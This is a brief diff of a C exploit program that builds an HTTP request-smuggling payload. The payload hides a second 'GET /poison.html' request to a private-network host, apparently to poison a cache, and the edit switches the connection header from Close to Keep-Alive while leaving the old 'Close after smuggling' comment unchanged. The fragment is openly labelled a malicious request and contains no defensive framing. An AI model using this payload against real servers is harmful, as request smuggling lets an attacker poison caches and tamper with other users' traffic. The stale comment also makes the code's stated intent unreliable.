@@ -45,7 +45,7 @@ int main() {
         "\r\n"  // End of first request
         "GET /poison.html HTTP/1.1\r\n"  // Smuggled request
         "Host: 192.168.1.202\r\n"
-        "Connection: Close\r\n"  // Close after smuggling
+        "Connection: Keep-Alive\r\n"  // Close after smuggling
         "\r\n");
 
     // Send the malicious request
